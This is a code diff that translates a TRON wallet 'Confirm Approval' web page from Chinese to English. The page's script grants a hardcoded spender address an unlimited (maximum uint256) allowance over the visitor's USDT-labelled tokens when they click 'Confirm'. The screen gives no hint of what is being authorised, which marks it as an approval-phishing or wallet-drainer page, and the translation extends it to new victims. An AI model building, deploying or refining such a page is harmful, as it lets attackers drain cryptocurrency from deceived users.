@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>确认授权</title>
+  <title>Confirm Approval</title>
   <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
@@ -44,23 +44,23 @@
 <body>
 
   <div class="card">
-    <h2>请确认授权</h2>
-    <p>授权合约地址：</p>
+    <h2>Please Confirm Approval</h2>
+    <p>Contract Address to Approve:</p>
     <div class="address" id="contractAddress">TXXXXXXXXXXXXXXXXXXXX</div>
-    <button onclick="approve()">确认</button>
+    <button onclick="approve()">Confirm</button>
     <div id="walletStatus"></div>
   </div>
 
   <script>
-    const tokenAddress = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj'; // USDT 合约
-    const spender = 'TGiK8Zp5UaKRi8Uup16vdYJPboGAGwNWzf'; // 替换为你的合约地址
+    const tokenAddress = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj'; // USDT contract
+    const spender = 'TGiK8Zp5UaKRi8Uup16vdYJPboGAGwNWzf'; // Your contract address
     const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
     document.getElementById('contractAddress').textContent = spender;
 
     async function approve() {
       if (typeof window.tronWeb === 'undefined' || !window.tronWeb.defaultAddress.base58) {
-        document.getElementById('walletStatus').innerText = '请使用 TronLink、TokenPocket 或 MathWallet 打开此页面';
+        document.getElementById('walletStatus').innerText = 'Please open this page with TronLink, TokenPocket, or MathWallet';
         return;
       }
 
@@ -69,9 +69,9 @@
         const tx = await contract.approve(spender, maxUint).send({
           feeLimit: 100_000_000
         });
-        alert('授权成功！交易哈希：' + tx);
+        alert('Approval successful! Transaction hash: ' + tx);
       } catch (e) {
-        alert('授权失败：' + e.message);
+        alert('Approval failed: ' + e.message);
       }
     }
   </script>
